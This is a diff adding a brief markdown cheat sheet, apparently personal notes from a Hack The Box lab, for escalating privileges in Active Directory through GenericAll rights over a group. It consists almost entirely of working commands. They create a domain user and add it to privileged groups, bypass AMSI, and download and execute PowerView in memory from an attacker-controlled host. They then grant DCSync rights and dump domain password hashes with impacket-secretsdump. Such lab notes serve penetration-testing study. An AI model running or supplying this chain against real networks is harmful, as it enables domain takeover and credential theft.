@@ -1,0 +1,20 @@
+# GenericAll over a group
+
+```bash
+net user john abc123! /add /domain
+net group "Exchange Windows Permissions" john /add
+net localgroup "Remote Management Users" john /add
+
+# after creating a user, start this on powershell
+menu
+Bypass-4MSI
+iex(new-object net.webclient).downloadstring('http://10.10.14.19/PowerView.ps1')
+
+# Next we can give john's credentials and give him CDSync rights
+$pass = convertto-securestring 'abc123!' -asplain -force
+$cred = new-object system.management.automation.pscredential('htb\john', $pass)
+Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
+
+# Perform DCSync!
+impacket-secretsdump htb.local/john@10.10.10.161 
+```
